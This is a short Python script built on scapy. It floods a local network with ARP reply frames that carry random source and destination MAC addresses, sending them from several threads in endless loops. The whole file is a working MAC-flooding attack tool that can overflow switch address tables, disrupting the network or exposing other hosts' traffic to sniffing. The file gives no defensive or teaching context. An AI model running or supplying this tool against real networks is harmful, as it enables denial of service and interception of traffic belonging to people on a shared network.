from scapy.all import *
from time import sleep
import random
import string
import threading
import os

packetCount = 0

print("Script must run as root")
threads = int(input("Threads: "))

def generateRandomMac():
    mac = ""
    for i in range (0, 6):
        digit = hex(random.randint(0,255))      # generating a hexadecimal value 
        digit = digit[2:]                       # removing the "0x" at the start
        if len(digit) == 1:                     # if the value hase only one digit
            digit = "0" + digit                 # make it two
        mac = mac + digit +":"                  # separate the values
    return mac[:-1]


def sendPacket(sourceMac, destinationMac):
    global packetCount
    sendp(Ether(src=sourceMac,dst=destinationMac)/ARP(op=2, psrc="0.0.0.0", hwdst=destinationMac)/Padding(load="X"*18),verbose = False)
    packetCount = packetCount +1
    print("Packets: " + str(packetCount))
def floodMac():
    while True:
        sendPacket(generateRandomMac(),generateRandomMac())

def startThreads():
    global packetCount
    print("called startthreads")
    for i in range(1,threads):
        print(str(i))
        t = threading.Thread(target=floodMac)
        t.start()

startThreads()
print(generateRandomMac())
